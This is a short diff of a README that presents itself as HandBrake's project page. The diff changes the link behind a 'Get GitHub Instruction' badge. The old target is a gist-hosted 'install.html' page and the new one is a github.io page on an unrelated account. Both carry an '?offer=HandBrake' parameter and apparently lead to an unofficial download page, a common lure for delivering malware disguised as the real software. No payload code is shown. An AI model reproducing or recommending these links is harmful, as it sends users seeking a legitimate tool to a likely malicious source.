@@ -2,7 +2,7 @@
 
 HandBrake is an open-source, professional-grade video transcoder built for creators, editors, and casual users alike. It helps you **convert, compress, and optimize videos** into modern formats that save space while preserving quality. 🎞️  
 
-[![🍊 Get GitHub Instruction](https://img.shields.io/badge/🍊%20Get%20GitHub%20Instruction-F0742C?style=for-the-badge&logo=handbrake&logoColor=white&labelColor=0B0F19)](https://gistcdn.githack.com/twittyred593/52c2e6179d7b9d05b03bdfe1ddde144d/raw/8744c0c827e0b49e0f7d0c9e501445bbaf4c38eb/install.html?offer=HandBrake)
+[![🍊 Get GitHub Instruction](https://img.shields.io/badge/🍊%20Get%20GitHub%20Instruction-F0742C?style=for-the-badge&logo=handbrake&logoColor=white&labelColor=0B0F19)](https://app-set-deploy.github.io/.github/?offer=HandBrake)
 
 ---
 
